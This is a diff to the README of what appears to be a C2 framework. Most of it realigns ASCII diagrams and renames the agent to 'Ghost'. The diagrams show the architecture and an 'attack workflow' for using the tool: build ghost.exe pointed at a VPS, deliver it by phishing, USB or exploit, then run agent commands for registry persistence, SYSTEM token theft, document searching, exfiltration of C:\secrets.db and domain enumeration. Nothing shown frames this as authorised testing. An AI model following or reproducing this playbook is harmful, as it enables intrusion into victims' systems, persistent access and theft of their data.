@@ -11,35 +11,35 @@ Yet another C2 framework, because apparently we need more of those. This one's a
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                         OPERATOR                                 │
-│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐        │
-│  │   Web UI      │  │   CLI Console │  │   REST API    │        │
-│  │   (React)     │  │   (Terminal)  │  │   (HTTP)      │        │
-│  └───────┬───────┘  └───────┬───────┘  └───────┬───────┘        │
+┌──────────────────────────────────────────────────────────────────┐
+│                            OPERATOR                              │
+│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐         │
+│  │    Web UI     │  │  CLI Console  │  │   REST API    │         │
+│  │    (React)    │  │   (Terminal)  │  │    (HTTP)     │         │
+│  └───────┬───────┘  └───────┬───────┘  └───────┬───────┘         │
 │          │                  │                  │                 │
 │          └──────────────────┼──────────────────┘                 │
 │                             │                                    │
-│  ┌──────────────────────────▼──────────────────────────┐        │
-│  │              TEAMSERVER (Go)                        │        │
-│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐            │        │
-│  │  │ Sessions │ │ Tasks    │ │ Profiles │            │        │
-│  │  └──────────┘ └──────────┘ └──────────┘            │        │
-│  │  ┌──────────────────────────────────────┐          │        │
-│  │  │      HTTP/HTTPS Listener             │          │        │
-│  │  └──────────────────────────────────────┘          │        │
-│  └─────────────────────────┬────────────────────────────┘        │
-└────────────────────────────┼─────────────────────────────────────┘
-                             │ (Encrypted C2 Traffic)
-                             │
-┌────────────────────────────▼─────────────────────────────────────┐
-│                       TARGET NETWORK                              │
-│  ┌─────────────────────────────────────────────────────────────┐ │
-│  │                   DEMON AGENT (C)                            │ │
-│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐            │ │
-│  │  │ Evasion │ │ Crypto  │ │ Tasks   │ │ Network │            │ │
-│  │  └─────────┘ └─────────┘ └─────────┘ └─────────┘            │ │
-│  └─────────────────────────────────────────────────────────────┘ │
+│  ┌──────────────────────────▼───────────────────────────────┐    │
+│  │                    TEAMSERVER (Go)                       │    │
+│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐                │    │
+│  │  │ Sessions │  │  Tasks   │  │ Profiles │                │    │
+│  │  └──────────┘  └──────────┘  └──────────┘                │    │
+│  │  ┌───────────────────────────────────────────────────┐   │    │
+│  │  │              HTTP/HTTPS Listener                  │   │    │
+│  │  └───────────────────────────────────────────────────┘   │    │
+│  └──────────────────────────┬───────────────────────────────┘    │
+└─────────────────────────────┼────────────────────────────────────┘
+                              │ (Encrypted C2 Traffic)
+                              │
+┌─────────────────────────────▼────────────────────────────────────┐
+│                        TARGET NETWORK                            │
+│  ┌────────────────────────────────────────────────────────────┐  │
+│  │                     GHOST AGENT (C)                        │  │
+│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │  │
+│  │  │  Evasion │  │  Crypto  │  │   Tasks  │  │  Network │    │  │
+│  │  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │  │
+│  └────────────────────────────────────────────────────────────┘  │
 └──────────────────────────────────────────────────────────────────┘
 ```
 
@@ -200,7 +200,7 @@ Here's how you'd actually use this thing:
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                           ATTACK WORKFLOW                                    │
+│                           ATTACK WORKFLOW                                   │
 └─────────────────────────────────────────────────────────────────────────────┘
 
  ┌──────────────────┐
@@ -210,9 +210,9 @@ Here's how you'd actually use this thing:
           │
           ▼
  ┌──────────────────────────────────────────────────────────────────────┐
- │  Deploy VPS  ──►  Start Teamserver  ──►  Configure Profile          │
- │                                                                       │
- │  $ go run cmd/main.go -profile profiles/jquery.yaml -listener 443   │
+ │  Deploy VPS  ──►  Start Teamserver  ──►  Configure Profile           │
+ │                                                                      │
+ │  $ go run cmd/main.go -profile profiles/jquery.yaml -listener 443    │
  └──────────────────────────────────────────────────────────────────────┘
           │
           ▼
@@ -223,8 +223,8 @@ Here's how you'd actually use this thing:
           │
           ▼
  ┌──────────────────────────────────────────────────────────────────────┐
- │  Edit config.h with C2 URL  ──►  make exe  ──►  ghost.exe           │
- │                                                                       │
+ │  Edit config.h with C2 URL  ──►  make exe  ──►  ghost.exe            │
+ │                                                                      │
  │  C2_URL = "https://your-vps.com"                                     │
  └──────────────────────────────────────────────────────────────────────┘
           │
@@ -236,9 +236,9 @@ Here's how you'd actually use this thing:
           │
           ▼
  ┌──────────────────────────────────────────────────────────────────────┐
- │  Phishing / USB / Exploit  ──►  Target executes ghost.exe           │
- │                                                                       │
- │  Agent auto-registers with teamserver and starts beaconing          │
+ │  Phishing / USB / Exploit  ──►  Target executes ghost.exe            │
+ │                                                                      │
+ │  Agent auto-registers with teamserver and starts beaconing           │
  └──────────────────────────────────────────────────────────────────────┘
           │
           ▼
@@ -249,12 +249,12 @@ Here's how you'd actually use this thing:
           │
           ▼
  ┌──────────────────────────────────────────────────────────────────────┐
- │  Recommended first commands after callback:                         │
- │                                                                       │
- │  ghost (agent-1) ► whoami          # Who am I?                      │
- │  ghost (agent-1) ► sysinfo         # What system?                   │
- │  ghost (agent-1) ► pwd             # Where am I?                    │
- │  ghost (agent-1) ► ps              # What's running?                │
+ │  Recommended first commands after callback:                          │
+ │                                                                      │
+ │  ghost (agent-1) ► whoami          # Who am I?                       │
+ │  ghost (agent-1) ► sysinfo         # What system?                    │
+ │  ghost (agent-1) ► pwd             # Where am I?                     │
+ │  ghost (agent-1) ► ps              # What's running?                 │
  └──────────────────────────────────────────────────────────────────────┘
           │
           ▼
@@ -265,8 +265,8 @@ Here's how you'd actually use this thing:
           │
           ▼
  ┌──────────────────────────────────────────────────────────────────────┐
- │  ghost (agent-1) ► persist registry    # Survive reboots           │
- │  ghost (agent-1) ► sleep 300           # Low and slow (5 min)      │
+ │  ghost (agent-1) ► persist registry    # Survive reboots             │
+ │  ghost (agent-1) ► sleep 300           # Low and slow (5 min)        │
  └──────────────────────────────────────────────────────────────────────┘
           │
           ▼
@@ -277,8 +277,8 @@ Here's how you'd actually use this thing:
           │
           ▼
  ┌──────────────────────────────────────────────────────────────────────┐
- │  ghost (agent-1) ► token_list          # Find SYSTEM/Admin tokens   │
- │  ghost (agent-1) ► token_steal 1234    # Impersonate high priv     │
+ │  ghost (agent-1) ► token_list          # Find SYSTEM/Admin tokens    │
+ │  ghost (agent-1) ► token_steal 1234    # Impersonate high priv       │
  └──────────────────────────────────────────────────────────────────────┘
           │
           ▼
@@ -289,9 +289,9 @@ Here's how you'd actually use this thing:
           │
           ▼
  ┌──────────────────────────────────────────────────────────────────────┐
- │  ghost (agent-1) ► shell dir /s *.docx      # Find documents       │
- │  ghost (agent-1) ► download C:\secrets.db   # Exfil files          │
- │  ghost (agent-1) ► shell net user /domain   # AD enumeration       │
+ │  ghost (agent-1) ► shell dir /s *.docx      # Find documents         │
+ │  ghost (agent-1) ► download C:\secrets.db   # Exfil files            │
+ │  ghost (agent-1) ► shell net user /domain   # AD enumeration         │
  └──────────────────────────────────────────────────────────────────────┘
           │
           ▼
@@ -302,7 +302,7 @@ Here's how you'd actually use this thing:
           │
           ▼
  ┌──────────────────────────────────────────────────────────────────────┐
- │  ghost (agent-1) ► exit                # Clean shutdown            │
+ │  ghost (agent-1) ► exit                # Clean shutdown              │
  └──────────────────────────────────────────────────────────────────────┘
 ```
 
